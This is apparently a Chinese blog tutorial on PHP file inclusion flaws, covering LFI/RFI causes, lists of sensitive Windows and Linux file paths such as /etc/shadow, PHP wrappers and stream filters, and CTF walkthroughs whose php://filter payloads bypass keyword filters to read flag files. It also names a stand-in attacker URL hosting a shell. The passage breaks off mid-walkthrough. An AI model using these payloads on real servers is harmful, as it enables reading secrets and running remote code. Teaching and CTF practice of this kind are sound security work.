
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/big-blame-general/p/18845250" title="发布于 2025-04-24 20:13">
    <span role="heading" aria-level="2">文件包含</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        
        详解文件包含，有这一篇足矣
    </div>
<div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="文件包含">文件包含</h1>
<ul>
<li>
<h3 id="什么是文件包含">什么是文件包含</h3>
<ul>
<li>
<h5 id="文件包含是一种在编程中常用的技术尤其在-web-开发领域较为常见它允许一个程序将另一个文件的内容整合到自身代码里">文件包含是一种在编程中常用的技术，尤其在 Web 开发领域较为常见，它允许一个程序将另一个文件的内容整合到自身代码里</h5>
</li>
</ul>
</li>
<li>
<h3 id="用途">用途</h3>
<ul>
<li><strong>代码复用</strong>：能够把常用的代码封装在单独的文件里，在多个程序中重复使用，提高开发效率</li>
<li><strong>模块化开发</strong>：将程序拆分成多个模块，每个模块负责特定的功能，方便代码的管理和维护</li>
</ul>
</li>
<li>
<h3 id="漏洞产生原因">漏洞产生原因</h3>
<ul>
<li><strong>动态文件包含机制</strong>
<ul>
<li>应用程序使用动态包含功能（如 PHP 的<code>include()</code>、<code>require()</code>，Java 的<code>RequestDispatcher</code>等）时，若未对用户输入的文件名进行有效过滤，攻击者可通过构造恶意路径包含任意文件</li>
</ul>
</li>
<li><strong>路径遍历攻击</strong>
<ul>
<li>攻击者通过输入类似<code>../../etc/passwd</code>的路径，绕过应用程序的目录限制，访问系统敏感文件</li>
</ul>
</li>
<li><strong>远程文件包含（RFI）</strong>
<ul>
<li>若服务器配置允许（如 PHP 的<code>allow_url_include</code>为<code>On</code>），攻击者可指定远程 URL 包含恶意代码（如<code>http://attacker.com/shell.php</code>）</li>
</ul>
</li>
<li><strong>逻辑缺陷</strong>
<ul>
<li>应用程序未正确验证文件类型或路径，导致恶意文件被执行（如将<code>.php</code>文件伪装成<code>.jpg</code>）</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="可能利用漏洞">可能利用漏洞</h3>
<ul>
<li><strong>本地文件包含（LFI）</strong>：攻击者可以通过构造恶意的文件路径，让应用程序包含本地的敏感文件，像配置文件、数据库文件等，从而获取敏感信息。</li>
<li><strong>远程文件包含（RFI）</strong>：攻击者可以诱导应用程序包含远程服务器上的恶意文件，进而执行恶意代码，控制服务器。</li>
</ul>
</li>
<li>
<h3 id="常见函数">常见函数</h3>
<ul>
<li><strong>require()</strong>:找不到被包含的文件会产生致命错误，并停止脚本运行</li>
<li><strong>include()</strong>:找不到被包含的文件只会产生警告，脚本继续执行</li>
<li><strong>require_once()</strong>与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li>
<li><strong>include_once()</strong>与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</li>
</ul>
</li>
<li>
<h3 id="敏感文件默认路径">敏感文件默认路径</h3>
<ul>
<li>
<h4 id="windows">Windows</h4>
<ul>
<li>
<pre><code class="language-css">C:\boot.ini      //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml     //IIS配置文件
C:\windows\repair\sam         //存储Windows系统初次安装的密码
C:\ProgramFiles\mysql\my.ini        //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD      //MySQL root密码
C:\windows\php.ini              //php配置信息
C:\Windows\system.ini // 系统初始化配置文件，记录了一些早期 Windows 系统的配置信息
C:\Windows\win.ini //Windows 系统早期的初始化配置文件，涉及系统运行、桌面设置等相关配置
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup // 系统开机启动项文件夹，可查看哪些程序随系统自动启动
C:\Users\All Users\Application Data // 所有用户共享的应用程序数据文件夹，可能包含一些全局配置信息
C:\inetpub\logs\LogFiles //IIS 服务器日志文件存放目录，可用于分析网站访问情况
</code></pre>
</li>
</ul>
</li>
<li>
<h4 id="linux">Linux</h4>
<ul>
<li>
<pre><code class="language-css">/etc/passwd               //账户信息
/etc/shadow                 //账户密码信息
/usr/local/app/apache2/conf/httpd.conf              //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf          //虚拟网站配置
/usr/local/app/php5/lib/php.ini             //PHP相关配置
/etc/httpd/conf/httpd.conf              //Apache配置文件
/etc/my.conf                    //mysql配置文件
/var/log/nginx/access.log             ////日志文件
/etc/group // 用户组信息文件，记录系统中所有用户组的相关信息
/etc/profile // 系统全局环境变量和启动脚本配置文件，用户登录时会执行其中配置
/root/.bashrc //root 用户的 bash shell 配置文件，定义 root 用户 bash 环境的个性化设置
/var/log/secure // 记录系统安全相关事件，如用户登录尝试（成功或失败）等信息
/usr/local/nginx/conf/nginx.conf //Nginx 服务器默认配置文件 ，用于配置 Nginx 服务相关参数
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="php伪协议此处只列举几个常用的">PHP伪协议(此处只列举几个常用的)</h3>
<ul>
<li>
<h4 id="phpfilter">php://filter</h4>
<ul>
<li>
<h5 id="用途用于对数据流进行过滤和转换如-base64-编码html-实体编码等当它与包含函数一起使用时读取的文件由于是源码形式会被当做php文件进行执行故通常对其进行编码防止被执行">用途：用于对数据流进行过滤和转换，如 Base64 编码、HTML 实体编码等，当它与包含函数一起使用时，读取的文件由于是源码形式，会被当做php文件进行执行，故通常对其进行编码，防止被执行</h5>
</li>
<li>
<h5 id="协议的基本格式">协议的基本格式</h5>
<ul>
<li>
<pre><code class="language-php">php://filter/过滤器名称/resource=要读取的文件路径
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="实例">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
$file = 'example.txt';
$base64_encoded = file_get_contents('php://filter/convert.base64-encode/resource=' . $file);
echo $base64_encoded;
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出会将exampletxt文件的内容进行base64编码后输出">输出：会将"example.txt"文件的内容进行base64编码后输出</h5>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="phpinput">php://input</h4>
<ul>
<li>
<h5 id="用途用于读取原始的-http-请求体的内容它主要用于处理-post-请求中发送的数据可以接受post请求作为输入流的输入将请求作为输入传递给目标变量特别是当数据是以-json-或-xml-格式发送或者是其他非表单数据格式时">用途：用于读取原始的 HTTP 请求体的内容。它主要用于处理 POST 请求中发送的数据，可以接受POST请求作为输入流的输入，将请求作为输入传递给目标变量，特别是当数据是以 JSON 或 XML 格式发送，或者是其他非表单数据格式时</h5>
</li>
<li>
<h5 id="协议的基本格式-1">协议的基本格式</h5>
<ul>
<li>
<pre><code class="language-php">file=php://input
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="实例-1">实例</h5>
<ul>
<li>
<pre><code class="language-php">//当使用此协议时，需要通过POST方法进行传参
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200619321-1471646781.png" alt="屏幕截图 2025-04-24 182923" loading="lazy"></p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="data">data://</h4>
<ul>
<li>
<h5 id="用途用于直接在-url-中嵌入数据通常用于传递小型的文本或二进制数据">用途：用于直接在 URL 中嵌入数据，通常用于传递小型的文本或二进制数据</h5>
</li>
<li>
<h5 id="协议的基本格式-2">协议的基本格式</h5>
<ul>
<li>
<pre><code class="language-php">file=data://[&lt;mime-type&gt;][;base64],&lt;data&gt;
</code></pre>
</li>
<li>
<p><strong><code>&lt;mime-type&gt;</code></strong>：这是可选参数，用于指定数据的 MIME 类型，例如 <code>text/plain</code> 表示纯文本，<code>application/json</code> 表示 JSON 数据等。若未指定，默认的 MIME 类型是 <code>text/plain</code>。</p>
</li>
<li>
<p><strong><code>;base64</code></strong>：同样是可选参数，若指定了这个参数，后面的 <code>&lt;data&gt;</code> 部分必须是经过 Base64 编码的数据。</p>
</li>
<li>
<p><strong><code>&lt;data&gt;</code></strong>：这是实际要嵌入的数据内容。如果没有指定 <code>;base64</code>，则 <code>&lt;data&gt;</code> 为普通的文本数据；若指定了 <code>;base64</code>，则 <code>&lt;data&gt;</code> 需是 Base64 编码后的字符串</p>
</li>
</ul>
</li>
<li>
<h5 id="实例-2">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// 读取 Base64 编码的文本数据
$content = file_get_contents('data://text/plain;base64,' . base64_encode('Hello, World!'));
echo $content;
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出会输出原文">输出：会输出原文</h5>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="zip">zip://</h4>
<ul>
<li>
<h5 id="用途用于访问-zip-压缩文件中的文件这在需要直接读取或操作-zip-压缩包内文件时非常有用">用途：用于访问 ZIP 压缩文件中的文件，这在需要直接读取或操作 ZIP 压缩包内文件时非常有用</h5>
</li>
<li>
<h5 id="协议的基本格式-3">协议的基本格式</h5>
<ul>
<li>
<pre><code class="language-php">zip://&lt;zip_file_path&gt;#&lt;file_path_in_zip&gt;
</code></pre>
</li>
<li>
<p><strong><code>&lt;zip_file_path&gt;</code></strong>：ZIP 压缩文件在服务器文件系统中的完整路径。可以是相对路径（相对于当前工作目录）或绝对路径。</p>
</li>
<li>
<p><strong><code>#</code></strong>：分隔符，用于分隔 ZIP 压缩文件路径和压缩包内文件的路径。</p>
</li>
<li>
<p><strong><code>&lt;file_path_in_zip&gt;</code></strong>：ZIP 压缩包内要访问的文件的路径。该路径是相对于 ZIP 压缩包根目录的</p>
</li>
</ul>
</li>
<li>
<h5 id="实例-3">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// ZIP 压缩文件的路径
$zipFilePath = 'path/to/your/archive.zip';
// 压缩包内要访问的文件路径
$fileInZip = 'example.txt';

// 构造 zip:// 伪协议的 URL
$url = 'zip://' . $zipFilePath . '#' . $fileInZip;

// 读取文件内容
$fileContent = file_get_contents($url);

if ($fileContent === false) {
    echo "读取文件失败，可能是文件不存在或权限不足。";
} else {
    echo $fileContent;
}
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出会将在zipfilepath压缩包下名为fileinzip的文件内容输出">输出：会将在"zipFilePath"压缩包下名为"fileInZip"的文件内容输出</h5>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="file">file://</h4>
<ul>
<li>
<h5 id="用途用于访问本地文件系统中的文件它可以让你像访问远程资源一样访问本地文件">用途：用于访问本地文件系统中的文件，它可以让你像访问远程资源一样访问本地文件</h5>
</li>
<li>
<h5 id="协议基本格式">协议基本格式</h5>
<ul>
<li>
<pre><code class="language-php">file://&lt;文件路径&gt;
</code></pre>
</li>
<li>
<p><code>&lt;文件路径&gt;</code> 可以是相对路径或者绝对路径。在不同操作系统中，路径的表示方式有所不同：</p>
<ul>
<li><strong>Windows 系统</strong>：路径使用反斜杠 <code>\</code> 作为分隔符，但在 PHP 字符串里需要用双反斜杠 <code>\\</code> 或者单斜杠 <code>/</code> 来转义。例如，<code>file://C:/Users/username/Documents/example.txt</code> 或者 <code>file://C:\\Users\\username\\Documents\\example.txt</code>。</li>
<li><strong>Linux 系统</strong>：路径使用正斜杠 <code>/</code> 作为分隔符，例如 <code>file:///home/username/Documents/example.txt</code>。</li>
</ul>
</li>
</ul>
</li>
<li>
<h5 id="实例读取文件配合file_get_contents函数使用">实例（读取文件，配合file_get_contents函数使用）</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// Windows 系统示例
$windowsFilePath = 'file://C:/Users/username/Documents/example.txt';
$windowsContent = file_get_contents($windowsFilePath);
if ($windowsContent === false) {
    echo "读取 Windows 文件失败。";
} else {
    echo $windowsContent;
}

// Linux 系统示例
$linuxFilePath = 'file:///home/username/Documents/example.txt';
$linuxContent = file_get_contents($linuxFilePath);
if ($linuxContent === false) {
    echo "读取 Linux 文件失败。";
} else {
    echo $linuxContent;
}
?&gt;
</code></pre>
</li>
<li>
<h5 id="写入文件配合file_put_contents函数使用">写入文件，配合file_put_contents函数使用</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// Windows 系统示例
$windowsFilePath = 'file://C:/Users/username/Documents/output.txt';
$data = "这是要写入文件的内容。";
$bytesWritten = file_put_contents($windowsFilePath, $data);
if ($bytesWritten === false) {
    echo "写入 Windows 文件失败。";
} else {
    echo "成功写入 $bytesWritten 字节到 Windows 文件。";
}

// Linux 系统示例
$linuxFilePath = 'file:///home/username/Documents/output.txt';
$bytesWritten = file_put_contents($linuxFilePath, $data);
if ($bytesWritten === false) {
    echo "写入 Linux 文件失败。";
} else {
    echo "成功写入 $bytesWritten 字节到 Linux 文件。";
}
?&gt;
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="http-与-https远程文件包含">http:// 与 https://（远程文件包含）</h4>
<ul>
<li>
<h5 id="用途主要用于访问远程的-http-或-https-资源像网页api-接口">用途：主要用于访问远程的 HTTP 或 HTTPS 资源，像网页、API 接口</h5>
</li>
<li>
<h5 id="基本命令格式">基本命令格式</h5>
<ul>
<li>
<pre><code class="language-php">file = http://example.com/attack.php
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="实例-4">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// 使用 http:// 协议读取远程网页内容
$httpUrl = 'http://example.com';
$httpContent = file_get_contents($httpUrl);
if ($httpContent === false) {
    echo "读取 http 资源失败。";
} else {
    echo $httpContent;
}

// 使用 https:// 协议读取远程网页内容
$httpsUrl = 'https://example.com';
$httpsContent = file_get_contents($httpsUrl);
if ($httpsContent === false) {
    echo "读取 https 资源失败。";
} else {
    echo $httpsContent;
}
?&gt;
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="常见的过滤器承接上处的phpfilter">常见的过滤器（承接上处的php://filter）</h3>
<ul>
<li>
<h4 id="字符串过滤器">字符串过滤器</h4>
<ul>
<li>
<h4 id="名称stringrot13">名称：string.rot13</h4>
<ul>
<li>
<h5 id="命令基本格式">命令基本格式</h5>
<ul>
<li>
<pre><code class="language-php">php://filter/read=string.rot13/resource=目标文件名
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="原理">原理</h5>
<ul>
<li>将字母表中的每个字母替换为其在字母表中 13 个位置之后的字母 ，对字符串进行编码或解码</li>
</ul>
</li>
<li>
<h5 id="实例-5">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// 读取test.txt文件内容并应用string.rot13过滤器
$content = file_get_contents("php://filter/read=string.rot13/resource=test.txt"); 
echo $content; 
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出假设-testtxt-内容为hello-world经过stringrot13过滤器处理后输出uryyb-jbeyq">输出：假设 test.txt 内容为<code>Hello, World!</code>，经过<code>string.rot13</code>过滤器处理后，输出<code>Uryyb, Jbeyq!</code></h5>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="名称stringtoupper">名称：string.toupper</h4>
<ul>
<li>
<h5 id="命令基本格式-1">命令基本格式</h5>
<ul>
<li>
<pre><code class="language-php">php://filter/read=string.toupper/resource=目标文件名
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="原理-1">原理</h5>
<ul>
<li>将字母表中的每个字母替换为大写字母 ，对字符串进行编码或解码</li>
</ul>
</li>
<li>
<h5 id="实例-6">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// 读取test.txt文件内容并应用string.toupper过滤器
$content = file_get_contents("php://filter/read=string.toupper/resource=test.txt"); 
echo $content; 
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出假设-testtxt-内容为hello-world经过stringtoupper过滤器处理后输出heeloworld">输出：假设 test.txt 内容为<code>Hello, World!</code>，经过<code>string.toupper</code>过滤器处理后，输出<code>HEELO,WORLD!</code></h5>
</li>
</ul>
</li>
<li>
<h4 id="名称stringtolower">名称：string.tolower</h4>
<ul>
<li>
<h5 id="功能与stringtoupper差不多只是只是将内容全部转换为小写在此不多赘述">功能与string.toupper差不多，只是只是将内容全部转换为小写，在此不多赘述</h5>
</li>
</ul>
</li>
<li>
<h4 id="名称stringstrip_tags绕过死亡exit">名称：string.strip_tags(绕过死亡exit)</h4>
<ul>
<li>
<h5 id="命令基本格式-2">命令基本格式</h5>
<ul>
<li>
<pre><code class="language-php">strip_tags ( string $str [, string|array $allowable_tags = null ] ) : string
</code></pre>
</li>
<li>
<p><strong><code>$str</code></strong>：此为必需参数，代表要处理的字符串。</p>
</li>
<li>
<p><strong><code>$allowable_tags</code></strong>：这是可选参数，它可以是字符串或者数组类型。该参数用于指定允许保留的标签，除此之外的标签都会被移除</p>
</li>
</ul>
</li>
<li>
<h5 id="原理-2">原理</h5>
<ul>
<li>从字符串里移除 HTML 和 PHP 标签的内置函数</li>
</ul>
</li>
<li>
<h5 id="实例-7">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
$fp = fopen('php://output', 'w');
//允许存在标签&lt;b&gt;&lt;i&gt;&lt;u&gt;
stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE, "&lt;b&gt;&lt;i&gt;&lt;u&gt;");
fwrite($fp, "&lt;b&gt;bolded text&lt;/b&gt; enlarged to a &lt;h1&gt;level 1 heading&lt;/h1&gt;\n");
fclose($fp);
/* 输出： bolded text enlarged to a level 1 heading   */
//效果与上述一样
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'string.strip_tags', STREAM_FILTER_WRITE, array('b','i','u'));
fwrite($fp, "&lt;b&gt;bolded text&lt;/b&gt; enlarged to a &lt;h1&gt;level 1 heading&lt;/h1&gt;\n");
fclose($fp);
/* 输出： bolded text enlarged to a level 1 heading   */
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出">输出：</h5>
<pre><code class="language-php">&lt;b&gt;bolded text&lt;/b&gt; enlarged to a level 1 heading
&lt;b&gt;bolded text&lt;/b&gt; enlarged to a level 1 heading
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="转换过滤器">转换过滤器</h3>
<ul>
<li>
<h4 id="名称convertbase64-encode-decode">名称：convert.base64-encode （decode）</h4>
<ul>
<li>
<h5 id="基本命令格式-1">基本命令格式</h5>
<ul>
<li>
<pre><code class="language-php">php://filter/read=convert.base64-encode(convert.base64-decode)/resource=
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="原理-3">原理</h5>
<ul>
<li>将想要读取的源文件进行base64编码或者解码读取，防止源文件被当做php文件执行</li>
</ul>
</li>
<li>
<h5 id="实例-8">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
//进行base64编码，输出编码
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.base64-encode');
fwrite($fp, "This is a test.\n");
fclose($fp);

//将输入内容进行base64编码，每八个字符为一组输出
$param = array('line-length' =&gt; 8, 'line-break-chars' =&gt; "\r\n");
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.base64-encode', STREAM_FILTER_WRITE, $param);
fwrite($fp, "This is a test.\n");
fclose($fp);

//将输入内容进行base64解码，然后输出
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.base64-decode');
fwrite($fp, "VGhpcyBpcyBhIHRlc3QuCg==");
fclose($fp);
?&gt;
</code></pre>
</li>
<li>
<p>输出：</p>
<pre><code class="language-php">//第一个输出
VGhpcyBpcyBhIHRlc3QuCg==
//第二个输出
VGhpcyBp
cyBhIHRl
c3QuCg==
//第三个输出
This is a test.
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="名称convertquoted-printable-encode-decode">名称:convert.quoted-printable-encode （decode）</h4>
<ul>
<li>
<h5 id="基本命令格式-2">基本命令格式</h5>
<ul>
<li>
<pre><code class="language-php">php://filter/read=convert.quoted-printable-encode(decode)/resource=
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="原理-4">原理</h5>
<ul>
<li>将数据编码为引用可打印（Quoted-Printable）格式</li>
<li>引用可打印编码是一种文本编码方式，主要用于在只能处理 ASCII 字符的环境中安全传输包含非 ASCII 字符或特殊字符的数据。它的编码规则如下：
<ul>
<li>对于 ASCII 码范围在 33 到 126 之间（除了等号 <code>=</code>）的可打印字符，保持不变。</li>
<li>对于换行符（LF 或 CR+LF），保持不变。</li>
<li>对于其他所有字符，包括非 ASCII 字符、控制字符和等号 <code>=</code>，将其转换为 <code>=</code> 后面跟两个十六进制数字来表示该字符的 ASCII 码值</li>
</ul>
</li>
</ul>
</li>
<li>
<h5 id="实例-9">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
// 原始数据，包含非 ASCII 字符
$originalData = "Hello, 世界!";

// 使用过滤器进行引用可打印编码
$encodedStream = fopen('php://filter/read=convert.quoted-printable-encode/resource=php://memory', 'r+');
fwrite($encodedStream, $originalData);
rewind($encodedStream);
$encodedData = stream_get_contents($encodedStream);

// 输出结果
echo "原始数据: " . $originalData . "\n";
echo "编码数据: " . $encodedData . "\n";

// 关闭流
fclose($encodedStream);
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出-1">输出</h5>
<pre><code class="language-php">原始数据: Hello, 世界!
编码数据: Hello, =E4=B8=96=E7=95=8C!
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h4 id="名称converticonv">名称：convert.iconv.*</h4>
<ul>
<li>
<h5 id="基本命令格式-3">基本命令格式</h5>
<ul>
<li>
<pre><code class="language-php">php://filter/read=convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;/resource=
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="原理-5">原理</h5>
<ul>
<li>把输入数据从一种字符编码转换为另一种字符编码，以此保证数据在不同编码环境下可正确显示和处理，它借助 PHP 的 <code>iconv</code> 函数库来实现字符编码转换，<code>iconv</code> 函数库可识别多种字符编码，并能在它们之间进行转换</li>
</ul>
</li>
<li>
<h5 id="实例-10">实例</h5>
<ul>
<li>
<pre><code class="language-php">&lt;?php
$fp = fopen('php://output', 'w');
stream_filter_append($fp, 'convert.iconv.utf-16le.utf-8');
fwrite($fp, "T\0h\0i\0s\0 \0i\0s\0 \0a\0 \0t\0e\0s\0t\0.\0\n\0");
fclose($fp);
?&gt;
</code></pre>
</li>
<li>
<h5 id="输出-2">输出</h5>
<pre><code class="language-php">This is a test.
</code></pre>
</li>
</ul>
</li>
<li>
<h5 id="php支持的编码">php支持的编码</h5>
<ul>
<li>
<pre><code class="language-php">UCS-4*
UCS-4BE
UCS-4LE*
UCS-2
UCS-2BE
UCS-2LE
UTF-32*
UTF-32BE*
UTF-32LE*
UTF-16*
UTF-16BE*
UTF-16LE*
UTF-7
UTF7-IMAP
UTF-8*
ASCII*
EUC-JP*
SJIS*
eucJP-win*
SJIS-win*
ISO-2022-JP
ISO-2022-JP-MS
CP932
CP51932
SJIS-mac（别名：MacJapanese）
SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）
SJIS-Mobile#KDDI（别名：SJIS-KDDI）
SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）
UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）
UTF-8-Mobile#KDDI-A
UTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）
UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）
ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）
JIS
JIS-ms
CP50220
CP50220raw
CP50221
CP50222
ISO-8859-1*
ISO-8859-2*
ISO-8859-3*
ISO-8859-4*
ISO-8859-5*
ISO-8859-6*
ISO-8859-7*
ISO-8859-8*
ISO-8859-9*
ISO-8859-10*
ISO-8859-13*
ISO-8859-14*
ISO-8859-15*
ISO-8859-16*
byte2be
byte2le
byte4be
byte4le
BASE64
HTML-ENTITIES（别名：HTML）
7bit
8bit
EUC-CN*
CP936
GB18030
HZ
EUC-TW*
CP950
BIG-5*
EUC-KR*
UHC（别名：CP949）
ISO-2022-KR
Windows-1251（别名：CP1251）
Windows-1252（别名：CP1252）
CP866（别名：IBM866）
KOI8-R*
KOI8-U*
ArmSCII-8（别名：ArmSCII8）
</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<h3 id="压缩过滤器和转换过滤器需要的自行查看不做赘述"><a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener nofollow">压缩过滤器和转换过滤器</a>（需要的自行查看，不做赘述）</h3>
</li>
</ul>
</li>
<li>
<h3 id="实战">实战</h3>
<ul>
<li>
<h4 id="file_include江苏工匠杯"><a href="https://adworld.xctf.org.cn/challenges/list" target="_blank" rel="noopener nofollow">file_include(江苏工匠杯)</a></h4>
<ul>
<li>
<h5 id="进入发现直接给出了源码其中包含了一个名为checkphp的文件">进入，发现直接给出了源码，其中包含了一个名为check.php的文件<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200618956-1627607287.png" alt="屏幕截图 2025-04-24 113107" loading="lazy"></h5>
</li>
<li>
<h5 id="进入hack-bar看看是否可以直接访问此页面发现为空白页面">进入hack Bar,看看是否可以直接访问此页面，发现为空白页面<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200618599-1816276335.png" alt="屏幕截图 2025-04-24 113520" loading="lazy"></h5>
</li>
<li>
<h5 id="还记得我们上述提到的关于php读取文件的伪协议phpfilter吗payload后尝试看一下由于存在过滤所以payload当然越简单越好所以我们就不带上参数如readwrite等进行payload">还记得我们上述提到的关于php读取文件的伪协议php://filter吗，payload后尝试看一下，由于存在过滤，所以payload当然越简单越好，所以我们就不带上参数（如read，write等）进行payload</h5>
<pre><code class="language-php">payload
filename=php://filter/convert.base64-encode/resource=check.php
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200618145-1757242919.png" alt="屏幕截图 2025-04-24 142455" loading="lazy"></p>
</li>
<li>
<h5 id="发现新大陆页面出现了do-not-hack那这大概率就是checkphp这个页面会对提交的命令进行检查如果发现不合法字符就返回页面出现的这个命令那么大概率是对base64进行了过滤还记得我们上面提到的过滤器吗先尝试一下字符过滤器">发现新大陆，页面出现了"do not hack",那这大概率就是check.php这个页面会对提交的命令进行检查，如果发现不合法字符，就返回页面出现的这个命令。那么大概率是对base64进行了过滤，还记得我们上面提到的过滤器吗，先尝试一下字符过滤器<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200617721-724303445.png" alt="屏幕截图 2025-04-24 142605" loading="lazy"></h5>
</li>
<li>
<h5 id="发现还是被过滤了接下来尝试字符过滤器的其他类发现都被过滤了好吧没关系继续往下试由于转换过滤器中的base64一开始就试过了那么尝试一下其他类的payload如下">发现还是被过滤了，接下来尝试字符过滤器的其他类，发现都被过滤了，好吧，没关系，继续往下试，由于转换过滤器中的base64一开始就试过了，那么尝试一下其他类的，payload如下</h5>
<pre><code class="language-php">filename=php://filter/convert.quoted-printable-encode/resource=check.php
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200617247-363968805.png" alt="屏幕截图 2025-04-24 142704" loading="lazy"></p>
</li>
<li>
<h5 id="继续往下尝试尝试-iconv-这类方法payload如下">继续往下尝试，尝试 iconv 这类方法，payload如下</h5>
<pre><code class="language-php">filename=php://filter/convert.iconv.utf8.utf16/resource=check.php
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200616803-1365524984.png" alt="屏幕截图 2025-04-24 142917" loading="lazy"></p>
</li>
<li>
<h5 id="终于也是好起来了我们从回显中可以看到对readbase等关键字都进行了过滤所以当网页对很多关键字进行过滤时命令越简短越好">终于，也是好起来了，我们从回显中可以看到对"read""base"等关键字都进行了过滤，所以当网页对很多关键字进行过滤时，命令越简短越好<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200616290-1310062175.png" alt="屏幕截图 2025-04-24 142917" loading="lazy"></h5>
</li>
<li>
<h5 id="最后访问flagphp页面获得最终的flag">最后访问flag.php页面，获得最终的flag</h5>
<pre><code class="language-php">payload
filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php
</code></pre>
<p><img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200615795-1368904324.png" alt="屏幕截图 2025-04-24 165032" loading="lazy"></p>
</li>
</ul>
</li>
<li>
<h4 id="fileincludectf"><a href="https://adworld.xctf.org.cn/challenges/list" target="_blank" rel="noopener nofollow">fileinclude(CTF)</a></h4>
<ul>
<li>
<h5 id="进入题目发现还是以源码形式展现这个题很简单要求通过get传参两个参数其中file2需要对其进行内容检查file1并没有要求那我们只需要让-file2-满足要求让-file1-来读取flagphp的内容即可">进入题目，发现还是以源码形式展现，这个题很简单，要求通过GET传参两个参数，其中file2需要对其进行内容检查，file1并没有要求，那我们只需要让 file2 满足要求，让 file1 来读取flag.php的内容即可<img src="https://img2023.cnblogs.com/blog/3633127/202504/3633127-20250424200615397-2062130035.png" alt="屏幕截图 2025-04-24 184327" loading="lazy"></h5>
</li>
<li>
<h5 id="那么问题来了如何让file2的内容为hello-ctf还记得上面讲的php伪协议吗在这里可以运用此协议将数据写入file2中">那么问题来了，如何让file2的内容为“hello ctf”，还记得上面讲的php伪协议吗，在这里可以运用此协议将数据写入file2中</h5>
</li>
<li>
<h4 id="方法一---data">方法一   data://</h4>
<ul>
<li>
<h5 id="payload如下">payload如下</h5>
<pre><code class="language-php">//payload1
?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=data://text/plain,hello ctf
//payload2
?file1=php://filter/read=convert.base64-encode/resource=flag.php&amp;file2=data://text/plain;base64,aGVsbG8gY3Rm
</code></pre>
</li>
<li>
